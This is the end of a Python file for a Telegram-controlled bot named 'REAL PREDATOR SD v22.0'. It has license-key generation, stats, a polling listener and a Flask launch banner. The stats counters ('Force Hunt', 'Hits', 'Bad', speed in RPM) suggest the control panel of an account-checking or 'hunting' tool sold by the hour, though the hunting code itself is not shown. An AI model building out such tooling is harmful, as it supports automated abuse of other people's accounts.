        send_telegram_message(chat_id, welcome_msg, reply_markup=get_main_keyboard())
    
    elif text.startswith('/gen'):
        parts = text.split()
        if len(parts) < 2:
            send_telegram_message(chat_id, "⚠️ Usage: /gen <hours>\nExample: /gen 24", reply_markup=get_main_keyboard())
            return
        try:
            hours = int(parts[1])
            if hours not in [1, 2, 3, 4, 6, 8, 12, 24]:
                send_telegram_message(chat_id, "⚠️ Hours must be: 1,2,3,4,6,8,12,24", reply_markup=get_main_keyboard())
                return
            key_id, password, binary_key, normal_key, expires_at = generate_bot_key(hours)
            expiry = datetime.fromisoformat(expires_at).strftime('%Y-%m-%d %H:%M:%S')
            msg = f"""🔑 **New Key Generated**
📌 Key: <code>{binary_key}</code>
⏱ Duration: {hours} hours
📅 Expires: {expiry}
🔐 Normal Key: <code>{normal_key}</code>
📝 Note: {key_id}"""
            send_telegram_message(chat_id, msg, reply_markup=get_main_keyboard())
        except Exception as e:
            send_telegram_message(chat_id, f"⚠️ Error generating key: {e}", reply_markup=get_main_keyboard())
    
    elif text.startswith('/stats'):
        stats = get_bot_stats()
        msg = f"""📊 **Bot Statistics**
━━━━━━━━━━━━━━━━
📌 Total Keys: {stats['total']}
🟢 Active: {stats['active']}
✅ Used: {stats['used']}
📝 Logs: {stats['logs']}
👨‍💻 Dev Keys: {stats['devs']}
⚡ Force Hunt: {'ON' if state.force_hunt else 'OFF'}
🎯 Auto Mode: {'ON' if state.auto_mode else 'OFF'}
🔥 Status: {'RUNNING' if state.running else 'STOPPED'}
📈 Hits: {state.hits}
❌ Bad: {state.bad}
⚡ Speed: {state.speed} RPM"""
        send_telegram_message(chat_id, msg, reply_markup=get_main_keyboard())
    
    elif text.startswith('/stop'):
        state.running = False
        send_telegram_message(chat_id, "🛑 **Bot Stopped**\nAll hunting processes stopped.", reply_markup=get_main_keyboard())
    
    else:
        send_telegram_message(chat_id, "❓ Unknown command. Use /start", reply_markup=get_main_keyboard())

def get_bot_stats():
    conn = sqlite3.connect('bot_control.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM bot_keys')
    total = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM bot_keys WHERE used = 1')
    used = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM bot_keys WHERE used = 0 AND expires_at > ?', (datetime.now().isoformat(),))
    active = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM bot_logs')
    logs = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM dev_keys')
    dev_count = c.fetchone()[0]
    conn.close()
    return {'total': total, 'used': used, 'active': active, 'logs': logs, 'devs': dev_count}

# ================================================================
# BOT LISTENER - RENDER OPTIMIZED
# ================================================================

def bot_listener():
    """Telegram bot listener optimized for Render"""
    last_update_id = 0
    consecutive_errors = 0
    
    print("[*] Bot listener thread started successfully!")
    
    # إرسال رسالة تأكيد للمالك
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_ID, "text": "✅ **Bot Started Successfully on Render**\n\n⚡ REAL PREDATOR SD v22.0\n🇸🇩 Anmose Sudanese"},
            timeout=10
        )
        print("[✓] Startup notification sent to owner")
    except Exception as e:
        print(f"[!] Could not send startup notification: {e}")
    
    while state.bot_running:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {
                "offset": last_update_id + 1, 
                "timeout": 10,
                "allowed_updates": ["message", "callback_query"]
            }
            
            response = requests.get(url, params=params, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    consecutive_errors = 0
                    for update in data.get('result', []):
                        last_update_id = update['update_id']
                        
                        if 'callback_query' in update:
                            callback = update['callback_query']
                            threading.Thread(
                                target=handle_callback_query,
                                args=(
                                    callback.get('data', ''), 
                                    callback['message']['chat']['id'],
                                    callback['message']['message_id'],
                                    callback['id']
                                ),
                                daemon=True
                            ).start()
                            
                        elif 'message' in update:
                            msg = update['message']
                            chat_id = msg['chat']['id']
                            text = msg.get('text', '')
                            if text:
                                threading.Thread(
                                    target=handle_bot_command,
                                    args=(
                                        text, chat_id,
                                        msg['chat'].get('username', ''),
                                        msg['chat'].get('first_name', '')
                                    ),
                                    daemon=True
                                ).start()
            else:
                consecutive_errors += 1
                if consecutive_errors > 10:
                    print(f"[!] Bot: {consecutive_errors} errors, waiting...")
                    time.sleep(30)
                    consecutive_errors = 0
                    
        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            consecutive_errors += 1
            print(f"[!] Bot error: {e}")
            if consecutive_errors > 20:
                print("[!] Too many errors, restarting connection...")
                time.sleep(60)
                consecutive_errors = 0
            else:
                time.sleep(2)
        
        time.sleep(0.3)
    
    print("[!] Bot listener stopped")

def start_bot_with_retry():
    """Start bot with automatic retry"""
    while True:
        try:
            print("[*] Starting bot listener...")
            bot_listener()
        except Exception as e:
            print(f"[!] Bot crashed: {e}")
            print("[*] Restarting in 5 seconds...")
            time.sleep(5)

# ================================================================
# MAIN - RENDER OPTIMIZED
# ================================================================

if __name__ == '__main__':
    # Start bot in thread with auto-restart
    bot_thread = threading.Thread(target=start_bot_with_retry, daemon=False)
    bot_thread.start()
    print("[✓] Bot thread started on Render")
    
    # Send confirmation
    try:
        time.sleep(2)
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_ID, "text": "🟢 **Bot is LIVE on Render**\n\n🔥 REAL PREDATOR SD v22.0\n\nUse /start to begin"},
            timeout=5
        )
        print("[✓] Bot confirmed working")
    except Exception as e:
        print(f"[!] Bot startup confirmation failed: {e}")
    
    # Get port from Render
    port = int(os.environ.get('PORT', 7080))
    host = '0.0.0.0'
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║   🔥 REAL PREDATOR SD v22.0 - RENDER DEPLOYED            ║
║   📡 Bot Status: STARTED                                   ║
║   🌐 Web Interface: http://0.0.0.0:{port}                  ║
║   🤖 Telegram: @MRDPY                                      ║
║   📱 WhatsApp: +249907118667                               ║
║   ✅ Health Check: /health                                 ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Run Flask with production settings
    app.run(host=host, port=port, debug=False, threaded=True)
